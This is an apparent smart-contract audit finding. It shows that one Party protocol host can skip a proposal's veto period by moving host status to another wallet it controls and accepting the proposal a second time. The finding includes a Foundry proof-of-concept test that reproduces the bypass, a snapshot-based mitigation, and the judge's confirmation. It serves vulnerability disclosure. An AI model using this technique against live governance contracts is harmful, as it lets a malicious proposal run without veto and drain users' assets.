[H-02] Single host can unfairly skip veto period for proposal that does not have full host support
Submitted byMadalad, also found bysin1st3r__,adriro,Emmanuel,0xbepresent,evmboi32,Shaheen,3docSec, klau5 (1,2),ast3ros,pontifex,HChang26,bart1e,P12473, andrvierdiiev
After a proposal passes the vote threshold, there is a delay before it can be executed so that hosts get a chance tovetoit if they wish. If all hosts voting in favour of the proposal, then this veto period is skipped.
However, a single host can ensure the veto period is skipped even if no other hostsacceptthe proposal. The veto period is in place to prevent harmful/exploitative proposals from being executed, even if they are passed; therefore, a malicious/compromised host being able to skip the veto period can be seriously harmful to the protocol and its users. TheTornado Cash governance hackfrom May 2023 is a relevant example, during which the attacker was able to steal around$1 million worth of assets.
This attack has a very low cost and a very high potential impact. If a malicious proposal is crafted in the same way used by the Tornado Cash attacker using hiddenCREATE2andSELFDESTRUCToperations, then it is entirely feasible that it would meet the voting threshold, as many voters may not be savvy enough to spot the red flags.
Proof of Concept
PartyGovernance#abdicateHostis a function that allows a host to renounce their host privileges, and transfer them to another address.
File:contracts\party\PartyGovernance.sol457:/// @notice Transfer party host status to another.458:/// @param newPartyHost The address of the new host.459:functionabdicateHost(addressnewPartyHost)external{460:_assertHost();461:// 0 is a special case burn address.462:if(newPartyHost!=address(0)) {463:// Cannot transfer host status to an existing host.464:if(isHost[newPartyHost]) {465:revertInvalidNewHostError();466:             }467:isHost[newPartyHost] =true;468:         }else{469:// Burned the host status470:             --numHosts;471:         }472:isHost[msg.sender] =false;473:emitHostStatusTransferred(msg.sender,newPartyHost);474:     }
https://github.com/code-423n4/2023-10-party/blob/main/contracts/party/PartyGovernance.sol#L457
This can be done at any stage in the life cycle of a proposal. This means that a host canaccepta proposal, incrementing thenumHostsAcceptedvalue for that proposal, then transfer the host status to another wallet that they control (that has non-zero voting power) andacceptagain, incrementingnumHostsAcceptedfor a second time. This process can be repeated as many times as necessary untilnumHostsAcceptedis equal to the total number of hostsnumHosts. Once the proposal reaches the required vote threshold, the veto period will be skipped, despite only one host accepting.
The following foundry test shows the process described above. Copy and paste it into PartyGovernanceTest.t.sol to run.
functiontest_maliciousHost()public{// Create usersPartyParticipantalice=newPartyParticipant();PartyParticipantbob=newPartyParticipant();PartyParticipantchad=newPartyParticipant();PartyParticipantaliceAltWallet=newPartyParticipant();// Create partyuint16passThresholdBps=5100;(Partyparty,IERC721[]memorypreciousTokens,uint256[]memorypreciousTokenIds) =partyAdmin.createParty(partyImpl,PartyAdmin.PartyCreationMinimalOptions({host1:address(alice),host2:address(bob),passThresholdBps:passThresholdBps,totalVotingPower:151,preciousTokenAddress:address(toadz),preciousTokenId:1,rageQuitTimestamp:0,feeBps:0,feeRecipient:payable(0)}));// alice and bob are the only two hostsassert(party.isHost(address(alice)));assert(party.isHost(address(bob)));assert(!party.isHost(address(chad)));assert(!party.isHost(address(aliceAltWallet)));// mint governance NFTspartyAdmin.mintGovNft(party,address(alice),50,address(alice));partyAdmin.mintGovNft(party,address(bob),50,address(bob));partyAdmin.mintGovNft(party,address(chad),50,address(chad));partyAdmin.mintGovNft(party,address(aliceAltWallet),1,address(aliceAltWallet));// alice proposes a proposalPartyGovernance.Proposalmemoryp1=PartyGovernance.Proposal({maxExecutableTime:9999999999,proposalData:abi.encodePacked([0]),cancelDelay:uint40(1days)});vm.roll(block.number+1);uint256proposalId=alice.makeProposal(party,p1,0);// chad accepts, but bob (the other host) does notvm.roll(block.number+1);chad.vote(party,proposalId,0);// proposal meets vote threshold, but not all hosts have acceptedvm.roll(block.number+1);(PartyGovernance.ProposalStatusstatus,PartyGovernance.ProposalStateValuesmemoryvalues) =party.getProposalStateInfo(proposalId);assertEq(values.numHosts,2);assertEq(values.numHostsAccepted,1);assertEq(uint(status),uint(PartyGovernance.ProposalStatus.Passed));// not Ready => veto period has not been skipped// alice transfers host status to her other wallet addressvm.prank(address(alice));vm.roll(block.number+1);party.abdicateHost(address(aliceAltWallet));// alice accepts using her other walletvm.roll(block.number+1);aliceAltWallet.vote(party,proposalId,0);// veto is now skipped even though a host (bob) did not acceptvm.roll(block.number+1);(status,values) =party.getProposalStateInfo(proposalId);assertEq(values.numHosts,2);assertEq(values.numHostsAccepted,2);assertEq(uint(status),uint(PartyGovernance.ProposalStatus.Ready));// Ready for execution => veto period has now been skipped}
Recommended Mitigation Steps
Utilise snapshots for hosts in a similar way to howvotingPoweris currently handled, so thatacceptonly incrementsnumHostsAcceptedif the caller was a host atproposedTime - 1. This can be achieved under the current architecture in the following way:
Add a newboolmember to theVotingPowerSnapshotstruct namedisHost.MakeabdicateHostsave new snapshots to the_votingPowerSnapshotsByVotermapping with the updatedisHostvalues for the old and new hosts.Replace theisHost[msg.sender]check inacceptwith a snapshot check, similar to howgetVotingPowerAtis currently used.
Assessed type
Governance
gzeon (judge) commented:
Confirmed by sponsorhere.
Judging as high due to compromised governance.
0xble (Party) confirmed
Note: For full discussion, seehere.